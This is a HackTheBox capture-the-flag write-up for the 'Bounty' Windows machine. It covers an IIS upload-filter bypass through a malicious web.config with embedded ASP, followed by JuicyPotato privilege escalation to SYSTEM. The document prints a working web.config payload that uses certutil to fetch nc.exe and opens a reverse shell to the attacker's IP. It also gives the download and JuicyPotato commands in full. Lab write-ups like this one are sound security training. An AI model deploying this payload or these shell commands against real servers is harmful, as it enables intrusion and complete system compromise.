# Bounty — HackTheBox

| Field | Details |
|-------|---------|
| Platform | HackTheBox |
| Machine | Bounty |
| OS | Windows (Server 2008 R2) |
| Difficulty | Easy |
| Attacker IP | `10.10.16.36` |
| Target IP | `10.129.79.138` |
| Tools Used | Nmap, ffuf, curl, certutil, nc, JuicyPotato |
| Key Technique | `web.config` IIS handler registration bypass → Classic ASP RCE → `SeImpersonatePrivilege` → JuicyPotato SYSTEM |
| Date | October 2026 |

---

## Table of Contents

- [Attack Chain Summary](#attack-chain-summary)
- [Reconnaissance](#reconnaissance)
- [Foothold — web.config Upload RCE via IIS Handler Bypass](#foothold--webconfig-upload-rce-via-iis-handler-bypass)
- [Privilege Escalation — SeImpersonatePrivilege → JuicyPotato → SYSTEM](#privilege-escalation--seimpersonateprivilege--juicypotato--system)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Full Attack Chain Reference](#full-attack-chain-reference)
- [Commands Reference](#commands-reference)
- [MITRE ATT\&CK Mapping](#mitre-attck-mapping)

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|----------|
| 1 | Nmap full TCP sweep + targeted scan | Port 80 only — Microsoft IIS 7.5 on Windows; `X-Powered-By: ASP.NET` |
| 2 | ffuf content discovery with `.asp,.aspx` extensions | `transfer.aspx` (200) and `uploadedfiles/` (403) discovered |
| 3 | `.aspx` upload blocked; null byte bypass `shell.aspx%00.config` tested | Uploaded (HTTP 200) but stored as `shell.aspx.config` — IIS has no handler for double extension → 404; confirms `.config` not filtered |
| 4 | Craft malicious `web.config` with embedded ASP Classic payload | IIS registers `.config` as script handler; ASP executes inside the config file |
| 5 | Upload `web.config` + trigger via curl | IIS executes embedded ASP → `certutil` downloads `nc.exe` → reverse shell on port 4444 |
| 6 | Shell as `iis apppool\web` — `whoami /priv` | `SeImpersonatePrivilege` Enabled — JuicyPotato viable on Server 2008 R2 |
| 7 | Stage `nc.exe` + `JuicyPotato.exe` via `certutil` | Both tools downloaded to `C:\Users\merlin\` |
| 8 | JuicyPotato with CLSID `{e60687f7-01a1-40aa-86ac-db1cbf673334}` | Token impersonation → `NT AUTHORITY\SYSTEM` |
| 9 | JuicyPotato runs `cmd /c type root.txt > merlin\root.txt` | Root flag written to readable location |

---

## Reconnaissance

### Nmap — Two-Phase Scan

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -Pn -p- --open -T4 10.129.79.138
```

```
PORT   STATE SERVICE
80/tcp open  http
```

Only port 80 open. No SMB (445), RPC (135), or RDP (3389) — entire attack surface is the web server.

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -Pn -sS -sV -sC -p 80 -T4 10.129.79.138 -oA Bounty
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
| http-methods:
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Additional HTTP header scan:

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -Pn --script=http-* -T4 -p 80 10.129.79.138
```

```
|_http-devframework: ASP.NET detected. Found related header.
|   X-Powered-By: ASP.NET
```

**Key findings:**

| Detail | Value | Significance |
|--------|-------|--------------|
| Web server | Microsoft IIS 7.5 | Ships with Windows Server 2008 R2 — old OS, `SeImpersonatePrivilege` abuse is reliable |
| `X-Powered-By` | ASP.NET | `.asp`, `.aspx`, `.config` files can execute server-side code |
| OS inference | Windows Server 2008 R2 | IIS 7.5 only shipped with Server 2008 R2 |

### Content Discovery — ffuf

```bash
Hackerpatel007_1@htb[/htb]$ ffuf \
  -u 'http://10.129.79.138/FUZZ' \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -e .asp,.aspx \
  -mc 200,204,301,302,307,308,401,403,405 \
  -ac -t 80 -timeout 10 -c -r
```

```
transfer.aspx    [Status: 200, Size: 941]
uploadedfiles    [Status: 403]
```

| Path | Status | Notes |
|------|--------|-------|
| `/transfer.aspx` | 200 | File upload form — the intended attack surface |
| `/uploadedfiles/` | 403 | Directory exists; uploaded files land here and are web-accessible |

---

## Foothold — web.config Upload RCE via IIS Handler Bypass

### Step 1 — Probe the Upload Filter

Uploading `shell.aspx` directly is rejected: `Invalid File. Please try again.`

**Null byte test** (`shell.aspx%00.config`):

```http
Content-Disposition: form-data; name="FileUpload1"; filename="shell.aspx%00.config"
```

HTTP 200 accepted — but the file is saved literally as `shell.aspx.config`. IIS has no handler registered for `.aspx.config` (double extension) → 404 on request.

> **Why the .NET null byte bypass fails:** PHP's `move_uploaded_file()` calls a C `rename()` internally which stops at `\0`, saving only `shell.aspx`. .NET's managed `FileInfo`/stream classes handle the full string — both extensions are preserved verbatim. This technique categorically cannot work against .NET targets.

**Key discovery:** `.config` is not in the upload filter blocklist. Files land in web-accessible `/uploadedfiles/`. A `web.config` can register itself as ASP-executable and embed a payload.

### Step 2 — The web.config Attack Vector

`web.config` is IIS's XML configuration file (equivalent of Apache's `.htaccess`). Its `<handlers>` section can map any file extension to any ISAPI module. Mapping `*.config` to `asp.dll` makes `.config` files executable as Classic ASP.

The payload sits inside an XML comment block (`<!-- -->`). The XML parser ignores it when reading the file as configuration, but `asp.dll` processes the entire file text searching for `<% %>` delimiters — XML comment boundaries are irrelevant to the ASP interpreter.

### Step 3 — Craft the Malicious web.config

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add
        name="ConfigAspHandler"
        path="*.config"
        verb="*"
        modules="IsapiModule"
        scriptProcessor="%windir%\system32\inetsrv\asp.dll"
        resourceType="Unspecified"
        requireAccess="Write"
        preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<!--
<%
Dim wShell1
Set wShell1 = Server.CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("cmd /c certutil -urlcache -split -f http://10.10.16.36:8000/nc.exe C:\Users\Public\nc.exe && C:\Users\Public\nc.exe 10.10.16.36 4444 -e C:\Windows\system32\cmd.exe")
Set cmd1 = Nothing
Set wShell1 = Nothing
%>
-->
```

| Config Section | Purpose |
|---|---|
| `<handlers>` → `ConfigAspHandler` | Registers `*.config` → `asp.dll` — makes `.config` executable as Classic ASP |
| `<fileExtensions><remove .config>` | Removes `.config` from IIS request filter blocklist |
| `<hiddenSegments><remove web.config>` | Makes `web.config` directly requestable via URL |
| ASP payload in XML comment | `WScript.Shell.Exec` → `certutil` downloads `nc.exe` → reverse shell |

### Step 4 — Serve Tools and Start Listener

```bash
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000
Hackerpatel007_1@htb[/htb]$ nc -lvnp 4444
```

### Step 5 — Upload and Trigger

Upload `web.config` via `transfer.aspx` (`.config` not blocked by the filter).

```bash
Hackerpatel007_1@htb[/htb]$ curl http://10.129.79.138/uploadedFiles/web.config
```

IIS routes the request through `asp.dll` (per the new handler config), which executes the embedded payload.

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.79.138] 51234
Microsoft Windows [Version 6.1.7600]
c:\windows\system32\inetsrv> whoami
iis apppool\web
```

### Step 6 — User Flag

```
c:\> cd C:\Users\merlin\Desktop
C:\Users\merlin\Desktop> dir /a
```

```
10/06/2026  05:50 PM    34 user.txt
```

> **Always use `dir /a` on Windows.** Without `/a`, files with the Hidden or System attribute are invisible. Always run `dir /a` first on any Desktop or flag directory.

```
C:\Users\merlin\Desktop> type user.txt
bc0ba53d98a05a1c8742a49d5d66ef98
```

---

## Privilege Escalation — SeImpersonatePrivilege → JuicyPotato → SYSTEM

### Step 1 — Enumerate Privileges

```
C:\Users\merlin> whoami /priv
```

```
Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

`SeImpersonatePrivilege` is **Enabled** — the critical finding.

**Background:** `SeImpersonatePrivilege` allows a process to impersonate the security token of another authenticating user. The Potato exploit family abuses this by coercing the Windows DCOM infrastructure to make an authenticated SYSTEM-level connection to a fake COM server, capturing the SYSTEM token, and using `SeImpersonatePrivilege` to execute arbitrary commands as SYSTEM.

JuicyPotato is reliable on Server 2008 R2 because hundreds of valid CLSID targets exist. Microsoft partially mitigated this in Server 2019+ by restricting activatable CLSIDs.

### Step 2 — Stage Tools via certutil (Living off the Land)

```
C:\Users\merlin> certutil -urlcache -f http://10.10.16.36:8000/nc.exe C:\Users\merlin\nc.exe
C:\Users\merlin> certutil -urlcache -f http://10.10.16.36:8000/JuicyPotato.exe C:\Users\merlin\jp.exe
```

```
CertUtil: -URLCache command completed successfully.
```

`certutil` is a built-in signed Windows binary that bypasses many AV detections when used for file downloads.

### Step 3 — Execute JuicyPotato

```
C:\Users\merlin> jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c type C:\Users\Administrator\Desktop\root.txt > C:\Users\merlin\root.txt" -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}" -t *
```

```
Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} 1337
....
[+] authresult 0
{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```

| Flag | Value | Meaning |
|------|-------|---------|
| `-l 1337` | Port 1337 | Internal COM listener port |
| `-p cmd.exe` | Process | Binary to launch as SYSTEM |
| `-a "/c type root.txt > ..."` | Args | Payload: read root flag, write to readable path |
| `-c {e60687f7...}` | CLSID | Windows Update Medic Service — runs as SYSTEM on Server 2008 R2 |
| `-t *` | Token | Try both `CreateProcessWithTokenW` and `CreateProcessAsUser` |

### Step 4 — Root Flag

```
C:\Users\merlin> type root.txt
fa05f89f89a17780db584872a87c9abd
```

---

## Flags

| Flag | Value |
|------|-------|
| User Flag | `bc0ba53d98a05a1c8742a49d5d66ef98` |
| Root Flag | `fa05f89f89a17780db584872a87c9abd` |

---

## Lessons Learned

1. **Always use `dir /a` on Windows.** Without `/a`, Hidden and System attribute files are invisible. This is a habit to build immediately on any Windows foothold — flags are commonly hidden this way.

2. **The null byte bypass (`%00`) categorically cannot work against .NET.** PHP's `move_uploaded_file()` calls C `rename()` which stops at `\0`. .NET's managed `FileInfo` handles the full string. Knowing this distinction prevents wasting time on a technique that will never work on a .NET target.

3. **IIS `.config` file execution is a widely underestimated attack vector.** Upload filters block `.asp` and `.aspx` but commonly allow `.config`. IIS handler registration lets any extension be mapped to `asp.dll`. A `web.config` can register itself as Classic ASP-executable and embed a payload that executes when requested. Allowlist-based upload filters (permit only safe types) are the correct defence; denylist-based filters always miss edge cases.

4. **ASP Classic executes inside XML comment blocks.** `asp.dll` scans the full file text for `<% %>` delimiters regardless of surrounding XML comment structure. The `<!-- -->` wrapper makes the payload invisible to the XML parser but not to the ASP interpreter.

5. **`certutil -urlcache -split -f` is the most reliable Living-off-the-Land file transfer on Windows.** Present on every Windows version from XP onward, signed by Microsoft. Use when PowerShell download cradles are blocked by execution policy or EDR.

6. **`SeImpersonatePrivilege` on a Windows service account is a near-guaranteed SYSTEM path on pre-2019 Windows.** IIS app pool identities hold this privilege by default. On any Windows shell, `whoami /priv` is the first command to run. JuicyPotato for Server 2008/2012/2016; PrintSpoofer or GodPotato for Server 2019+.

7. **You don't need an interactive SYSTEM shell to read the root flag.** JuicyPotato's `-a` passes args directly to `cmd.exe` — `"/c type root.txt > merlin\root.txt"` runs as SYSTEM and writes the flag in one step without a second listener.

---

## Full Attack Chain Reference

```
Nmap -Pn -p- → port 80 only (IIS 7.5, Server 2008 R2)
X-Powered-By: ASP.NET → Classic ASP execution confirmed
ffuf -e .asp,.aspx → /transfer.aspx (200), /uploadedfiles/ (403)

Filter probing:
  .aspx → blocked
  shell.aspx%00.config → accepted but saved as shell.aspx.config → 404 (no handler)
  → .config not filtered → pivot to web.config attack

web.config crafted:
  → registers *.config → asp.dll
  → removes .config from request filter
  → embeds WScript.Shell payload in XML comment

python3 -m http.server 8000 (serve nc.exe)
nc -lvnp 4444
Upload web.config via transfer.aspx
curl /uploadedFiles/web.config
  → IIS routes through asp.dll
  → certutil downloads nc.exe
  → nc.exe connects back → iis apppool\web shell

dir /a C:\Users\merlin\Desktop → user.txt
type user.txt: bc0ba53d98a05a1c8742a49d5d66ef98

whoami /priv → SeImpersonatePrivilege: Enabled
certutil downloads nc.exe + JuicyPotato.exe
jp.exe -l 1337 -c {e60687f7-...} -t * -p cmd.exe -a "/c type root.txt > merlin\root.txt"
  → [+] authresult 0; NT AUTHORITY\SYSTEM; CreateProcessWithTokenW OK
type C:\Users\merlin\root.txt: fa05f89f89a17780db584872a87c9abd
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `sudo nmap -Pn -p- --open -T4 <IP>` | Full TCP sweep |
| `sudo nmap -Pn -sS -sV -sC -p 80 -T4 <IP> -oA Bounty` | Deep version + script scan |
| `sudo nmap -Pn --script=http-* -T4 -p 80 <IP>` | HTTP NSE scripts — fingerprint headers and framework |
| `ffuf -u 'http://<IP>/FUZZ' -w <wordlist> -e .asp,.aspx -mc 200,204,301,302,307,308,401,403,405 -ac -t 80` | Content discovery with ASP/ASPX extensions |
| Craft `web.config` with `<handlers>` registering `*.config` → `asp.dll` + embedded ASP payload | Core exploit — IIS handler registration bypass |
| Upload `web.config` via `transfer.aspx` | Bypass upload filter (`.config` not blocked) |
| `curl http://<IP>/uploadedFiles/web.config` | Trigger IIS to execute embedded ASP payload |
| `python3 -m http.server 8000` | Serve `nc.exe` and `JuicyPotato.exe` |
| `nc -lvnp 4444` | Reverse shell listener |
| `dir /a C:\Users\merlin\Desktop` | List all files including hidden |
| `whoami /priv` | Identify `SeImpersonatePrivilege` |
| `certutil -urlcache -f http://<LHOST>:8000/nc.exe C:\Users\merlin\nc.exe` | LotL file transfer |
| `certutil -urlcache -f http://<LHOST>:8000/JuicyPotato.exe C:\Users\merlin\jp.exe` | Download JuicyPotato |
| `jp.exe -l 1337 -p cmd.exe -a "/c type ...root.txt > ...merlin\root.txt" -c "{e60687f7-...}" -t *` | JuicyPotato SYSTEM token impersonation |
| `type C:\Users\merlin\root.txt` | Read root flag |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|--------------|
| T1595 | T1595.001 | Nmap three-phase scan: full TCP sweep, targeted service scan, HTTP NSE scripts |
| T1592 | T1592.002 | IIS 7.5 fingerprinting; `X-Powered-By: ASP.NET` identifies Classic ASP execution environment |
| T1083 | — | ffuf with `.asp,.aspx` extensions — discovered `/transfer.aspx` and `/uploadedfiles/` |
| T1190 | — | `web.config` IIS handler registration bypass — `.config` mapped to `asp.dll`, embedded payload executed |
| T1505 | T1505.003 | `web.config` with embedded ASP `WScript.Shell` acts as web shell |
| T1105 | — | `certutil -urlcache -f` — LotL download of `nc.exe` and `JuicyPotato.exe` |
| T1059 | T1059.003 | `cmd.exe /c certutil ... && nc.exe` via `WScript.Shell.Exec` in ASP payload |
| T1134 | T1134.001 | JuicyPotato `SeImpersonatePrivilege` abuse — DCOM SYSTEM token coercion via CLSID `{e60687f7-...}`, `CreateProcessWithTokenW` → `NT AUTHORITY\SYSTEM` |
| T1005 | — | Root flag read from `C:\Users\Administrator\Desktop\root.txt` via SYSTEM-privileged `cmd /c type` |

*HackTheBox retired machine — writeup published after official retirement.*
*Penetration Tester role in India | Target: January 2027*
